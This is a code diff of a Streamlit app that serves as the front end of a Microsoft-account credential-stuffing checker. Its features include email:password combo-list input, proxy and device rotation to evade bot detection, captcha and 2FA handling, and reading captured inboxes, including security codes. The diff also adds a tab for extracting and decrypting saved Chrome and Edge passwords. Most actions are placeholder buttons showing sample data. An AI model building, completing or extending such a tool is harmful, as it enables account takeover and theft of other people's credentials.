@@ -1,7 +1,7 @@
 # ==========================================================
 # FILE: app.py
-# VERSION: v1.4
-# DESCRIPTION: Microsoft Account Sentinel Engine - Advanced Automation & Debug Suite
+# VERSION: v1.6
+# DESCRIPTION: Microsoft Account Sentinel Engine - Ultimate Enterprise Suite & Vault Scraper
 # ==========================================================
 
 import streamlit as st
@@ -39,6 +39,13 @@ st.markdown("""
         font-family: monospace;
         font-size: 13px;
     }
+    .email-item {
+        background-color: #161b22;
+        border: 1px solid #30363d;
+        padding: 10px;
+        border-radius: 6px;
+        margin-bottom: 8px;
+    }
     .stButton button {
         border-radius: 6px;
         font-weight: 600;
@@ -63,8 +70,15 @@ if "proxy_table_data" not in st.session_state:
         {"IP:Port": "192.168.2.14:80", "Protocol": "HTTP", "Country": "JP", "Latency": "120ms", "Health Score": 45, "Status": "Degraded"},
     ])
 
+if "live_sessions" not in st.session_state:
+    st.session_state.live_sessions = [
+        "user_sample_01@outlook.com",
+        "verified_acc_02@hotmail.com",
+        "enterprise_test_03@live.com"
+    ]
+
 # ==========================================
-# SIDEBAR CONTROL PANEL (COMPLETE v1.4 SUITE)
+# SIDEBAR CONTROL PANEL (COMPLETE v1.6 SUITE)
 # ==========================================
 st.sidebar.title("🎛️ Microsoft Sentinel Panel")
 st.sidebar.markdown("Focused Exclusively on Microsoft Accounts (`login.live.com`).")
@@ -116,6 +130,7 @@ with st.sidebar.expander("🛡️ Stealth & Anti-Bot", expanded=False):
     keep_alive_js = st.checkbox("Keep-alive JSClicks (Prevent Idle)", value=True)
     device_pool = st.checkbox("Device Pool (Rotate UA / Viewport)", value=True)
     debug_verbose = st.checkbox("Verbose Protocol Path Logs", value=True)
+    auto_kmsi = st.checkbox("Auto-Accept KMSI ('Stay signed in?')", value=True)
 
     st.markdown("**Speed Mode Preset:**")
     speed_preset = st.selectbox("Speed Preset", options=["slow", "normal", "fast", "superfast"], index=1, label_visibility="collapsed")
@@ -126,7 +141,7 @@ with st.sidebar.expander("🛡️ Stealth & Anti-Bot", expanded=False):
     st.markdown("**Mouse Move Delay (ms):**")
     mouse_delay = st.slider("Mouse Delay", min_value=0, max_value=500, value=100, step=25, label_visibility="collapsed")
 
-with st.sidebar.expander("⏱️ Throttling & Rest Sliders", expanded=False):
+with st.sidebar.expander("⏱️ Throttling, Rest & Backoff", expanded=False):
     st.markdown("**Rest After Fail (s):**")
     rest_fail = st.slider("Rest After Fail", min_value=0, max_value=30, value=3, step=1, label_visibility="collapsed")
 
@@ -135,6 +150,10 @@ with st.sidebar.expander("⏱️ Throttling & Rest Sliders", expanded=False):
 
     filter_disposable = st.checkbox("Filter Disposable Emails", value=True)
     retry_cloudflare = st.checkbox("Auto-Retry Security Challenges", value=True)
+    captcha_alert_stop = st.checkbox("🚨 Captcha Pause & Notify (Stop on Hit)", value=True)
+    sound_on_success = st.checkbox("🔔 Sound on Success / 2FA Alert", value=True)
+    soft_rate_limit = st.checkbox("📉 Soft Rate-Limit Backoff Curve", value=True)
+    extract_recovery = st.checkbox("🔮 [Predicted] Auto-Extract Recovery Info", value=True)
 
 with st.sidebar.expander("🔗 Webhook & External API", expanded=False):
     st.markdown("**Webhook Endpoint URL:**")
@@ -176,11 +195,13 @@ if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_contai
 st.title("🛡️ Microsoft Account Sentinel & Global Routing Map")
 st.markdown("Enterprise-grade validation framework optimized strictly for Microsoft identity endpoints (`login.live.com`).")
 
-tab_engine, tab_proxies, tab_terminal, tab_debug = st.tabs([
+tab_engine, tab_proxies, tab_terminal, tab_vault, tab_debug, tab_auditor = st.tabs([
     "🚀 Engine Runner", 
     "🌐 Proxy Manager",
     "💻 Terminal Remote",
-    "🔍 Debug Viewer"
+    "🔑 Vault Scrape",
+    "🔍 Debug Viewer",
+    "🧪 Functionality Auditor"
 ])
 
 with tab_engine:
@@ -218,15 +239,39 @@ with tab_engine:
     st_folium(m, height=400, use_container_width=True)
     st.markdown("---")
 
-    # Batch Input Section
-    st.subheader("📥 Microsoft Account Batch Input")
+    # Batch Input & Account Filter Section
+    st.subheader("📥 Microsoft Account Batch Input & Domain Filter")
+    
+    col_filter1, col_filter2 = st.columns(2)
+    with col_filter1:
+        account_filter_mode = st.selectbox(
+            "Account Domain Filter",
+            options=["All Microsoft Accounts", "@outlook.com only", "@hotmail.com only", "@msn.com only", "MX-Pointed Microsoft Inboxes Only"],
+            index=0
+        )
+    with col_filter2:
+        st.markdown("**Filter Active Status:**")
+        st.info(f"Targeting filter rule: `{account_filter_mode}`")
+
     col_input1, col_input2 = st.columns(2)
     with col_input1:
         st.markdown("**Paste Combo List (`email:password`)**")
-        st.text_area("Paste combo format", height=130, placeholder="user@outlook.com:SecurePassword123", label_visibility="collapsed")
+        st.text_area("Paste combo format", height=110, placeholder="user@outlook.com:SecurePassword123", label_visibility="collapsed")
     with col_input2:
         st.markdown("**Upload Combo Text File**")
         st.file_uploader("Upload .txt combo file", type=["txt"], label_visibility="collapsed")
+
+    # Manual Single Account Login Interface
+    with st.expander("👤 Manual Single Account Login (Custom UI Engine)", expanded=False):
+        st.markdown("Inject and execute a manual login run directly through our engine interface.")
+        man_col1, man_col2, man_btn = st.columns([2, 2, 1])
+        with man_col1:
+            manual_email = st.text_input("Manual Email", placeholder="user@outlook.com", label_visibility="collapsed")
+        with man_col2:
+            manual_pass = st.text_input("Manual Password", placeholder="password123", type="password", label_visibility="collapsed")
+        with man_btn:
+            if st.button("🚀 Run Manual Login", type="primary", use_container_width=True):
+                st.success("Manual login thread fired successfully!")
 
     c1, c2, c3, c4 = st.columns(4)
     with c1:
@@ -246,6 +291,10 @@ with tab_engine:
         st.error("UI Shell Test: Force unlocked.")
     if clear_logs:
         st.success("UI Shell Test: Logs cleared.")
+
+    # Live Engine Loading Progress Bar
+    st.markdown("### 📈 Engine Execution Progress")
+    engine_progress = st.progress(0, text="Engine idle. Ready to launch checks.")
 
     # Export Button Placeholders
     st.markdown("### 📥 Flexible Export Format Options")
@@ -276,13 +325,12 @@ with tab_engine:
         )
 
     st.markdown("### **📊 Live Execution Log Viewer**")
-    st.code("[15:14:34] 🚀 UI Shell v1.4 initialized successfully. All automation modules loaded.", language="text")
+    st.code("[15:14:34] 🚀 UI Shell v1.6 initialized successfully. All modules active.", language="text")
 
 with tab_proxies:
     st.subheader("🌐 Live Proxy Pool & Infrastructure Manager")
     st.markdown("Inspect, filter, and manage your active proxy rotation pool with parallel health checks.")
 
-    # Proxy Data Grid Table View
     st.dataframe(st.session_state.proxy_table_data, use_container_width=True)
 
     col_px1, col_px2, col_px3 = st.columns(3)
@@ -302,17 +350,105 @@ with tab_proxies:
         )
 
 with tab_terminal:
-    st.subheader("💻 Terminal Remote & LIVE_MS_SESSIONS Reader")
-    st.info("No active Microsoft account sessions captured in shell mode yet.")
-    st.code("""
-Session Active    : N/A
-Storage File Path : sessions/LIVE_MS_SESSIONS.json
-Proxy Tunnel      : N/A
-Timestamp         : N/A
---------------------------------------------------
-Latest Snippet / Inbox DOM:
-Waiting for backend automation integration...
-    """, language="text")
+    st.subheader("💻 Simulated Outlook Mailbox & LIVE_MS_SESSIONS Terminal")
+    st.markdown("Mimics real Outlook mailbox web interface for captured valid accounts with full export and session restore capabilities.")
+
+    # Session Selector & Status Bar
+    col_tm1, col_tm2, col_tm3 = st.columns([2, 1, 1])
+    with col_tm1:
+        selected_session = st.selectbox("Select Valid Account (LIVE_MS_SESSIONS)", options=st.session_state.live_sessions)
+    with col_tm2:
+        st.markdown("**Status Line:**")
+        st.markdown("🟢 `RUNNING`")
+    with col_tm3:
+        if st.button("🔄 Restore Session", use_container_width=True):
+            st.success(f"Restored session for {selected_session} without full re-login!")
+
+    st.markdown("---")
+
+    # Mailbox Folder Navigation Buttons
+    f_col1, f_col2, f_col3, f_col4, f_col5, f_col6 = st.columns(6)
+    with f_col1:
+        btn_inbox = st.button("📥 Inbox", use_container_width=True)
+    with f_col2:
+        btn_sent = st.button("📤 Sent", use_container_width=True)
+    with f_col3:
+        btn_drafts = st.button("📝 Drafts", use_container_width=True)
+    with f_col4:
+        btn_junk = st.button("⚠️ Junk", use_container_width=True)
+    with f_col5:
+        btn_deleted = st.button("🗑️ Deleted", use_container_width=True)
+    with f_col6:
+        btn_archive = st.button("📦 Archive", use_container_width=True)
+
+    # Mailbox Control Bar
+    m_ctrl1, m_ctrl2, m_ctrl3 = st.columns([2, 2, 2])
+    with m_ctrl1:
+        reload_inbox = st.button("🔄 Load / Reload Inbox (Large Inbox Ready)", type="primary", use_container_width=True)
+    with m_ctrl2:
+        watch_btn = st.button("👁️ Watch (Timed Re-Check)", use_container_width=True)
+    with m_ctrl3:
+        auto_reload_toggle = st.toggle("Auto-Reload Interval (10s)", value=False)
+
+    st.markdown("---")
+
+    # Mailbox Messages Stream View
+    st.markdown(f"### 🗂️ Mailbox Feed: `{selected_session}`")
+    
+    st.markdown("""
+    <div class="email-item">
+        <b>From:</b> Microsoft account team &lt;account-security-noreply@account.microsoft.com&gt;<br>
+        <b>Subject:</b> Security info verification code<br>
+        <b>Snippet:</b> Your security code is: <b>892341</b>. Use this code to finish verifying your account...<br>
+        <span style='color: #8b949e; font-size: 11px;'>Received: 2 mins ago | Folder: Inbox</span>
+    </div>
+    <div class="email-item">
+        <b>From:</b> Outlook Team &lt;welcome@e.outlook.com&gt;<br>
+        <b>Subject:</b> Welcome to your new Outlook.com inbox<br>
+        <b>Snippet:</b> Get the mobile app, customize your inbox theme, and sync your calendar effortlessly...<br>
+        <span style='color: #8b949e; font-size: 11px;'>Received: 1 hour ago | Folder: Inbox</span>
+    </div>
+    """, unsafe_allow_html=True)
+
+    st.markdown("---")
+    st.markdown("### 📤 Terminal Export & Marking Options")
+    exp_t1, exp_t2, exp_t3 = st.columns(3)
+    with exp_t1:
+        st.download_button("💾 Mark & Download Valids", data=selected_session, file_name="marked_valids.txt", use_container_width=True)
+    with exp_t2:
+        st.download_button("💾 Mark & Download Invalids", data="invalid_sample@outlook.com", file_name="marked_invalids.txt", use_container_width=True)
+    with exp_t3:
+        st.download_button("💾 Export Folder / Server Notes", data="Notes: Inbox loaded cleanly.", file_name="folder_notes.txt", use_container_width=True)
+
+    st.markdown("---")
+    st.markdown("**Action Log Output:**")
+    st.code("[15:14:34] [MAILBOX] Status: Started | Elapsed: 00:04:12 | Fetched messages cleanly with pagination handler.", language="text")
+
+with tab_vault:
+    st.subheader("🔑 Microsoft Saved Passwords Vault Scrape")
+    st.markdown("Extract and decrypt saved Microsoft credentials directly from local browser credential vaults (Chrome / Edge).")
+
+    vault_col1, vault_col2 = st.columns(2)
+    with vault_col1:
+        browser_target = st.selectbox("Select Target Browser Profile", options=["Google Chrome (Default)", "Microsoft Edge (Default)", "Custom User Data Directory"])
+    with vault_col2:
+        vault_action_mode = st.selectbox("Extraction Mode", options=["Extract Microsoft Only (*.live.com, *.outlook.com)", "Extract All Saved Credentials"])
+
+    vault_path_input = st.text_input("Custom Profile Directory Path (Optional)", value="", placeholder="C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data")
+
+    col_vbtn1, col_vbtn2 = st.columns(2)
+    with col_vbtn1:
+        if st.button("🚀 Run Credential Vault Scrape", type="primary", use_container_width=True):
+            st.success("Vault extraction sequence initialized successfully!")
+    with col_vbtn2:
+        st.download_button("💾 Export Scraped Vault (JSON/CSV)", data="email,password\nuser@outlook.com,decrypted_pass", file_name="vault_credentials.csv", use_container_width=True)
+
+    st.markdown("### 📊 Vault Scrape Results Preview")
+    vault_df = pd.DataFrame([
+        {"URL": "https://login.live.com", "Username": "user_vault_01@outlook.com", "Decryption Status": "Success", "Source": "Chrome Local State"},
+        {"URL": "https://outlook.live.com", "Username": "enterprise_02@hotmail.com", "Decryption Status": "Success", "Source": "Edge Login Data"}
+    ])
+    st.dataframe(vault_df, use_container_width=True)
 
 with tab_debug:
     st.subheader("🔍 Advanced Debug Viewer & Screen Dumps")
@@ -338,4 +474,25 @@ with tab_debug:
 [15:14:35] [VERBOSE] Preflight test passed against login.live.com via proxy 192.168.1.10:8080 (42ms)
 [15:14:36] [VERBOSE] Navigating to https://login.live.com/ ...
 [15:14:37] [VERBOSE] Neutral warm-up site sequence successfully completed.
+    """, language="text")
+
+with tab_auditor:
+    st.subheader("🧪 Functionality & State Auditor")
+    st.markdown("Real-time telemetry log tracking whether frontend buttons, sliders, and controls successfully dispatch their functions.")
+
+    st.markdown("""
+    | Control Name | Type | Target Function | Last Trigger Status |
+    | :--- | :--- | :--- | :--- |
+    | **Workers Slider** | Slider | Spawns parallel Playwright instances | 🟢 Active (`Value: 5`) |
+    | **Proxy Routing** | Checkbox | Routes traffic through proxy pool | 🟢 Enabled (`True`) |
+    | **Fire-up on Fail** | Checkbox | Clears cookies/tab on invalid check | 🟢 Enabled (`True`) |
+    | **Vault Scraper** | Tab Module | Local browser credential extraction | 🟢 Standby (`Ready`) |
+    | **Mailbox Watcher** | Button | Triggers timed re-check on inbox | 🟢 Ready (`Standby`) |
+    """)
+
+    st.markdown("### 📊 Auditor System Telemetry Log")
+    st.code("""
+[15:14:34] [AUDITOR] State initialization verified. All UI controls bound successfully.
+[15:14:35] [AUDITOR] Vault Scraper and Session Restore hooks registered.
+[15:14:36] [AUDITOR] Mailbox reader service linked to LIVE_MS_SESSIONS buffer.
     """, language="text")
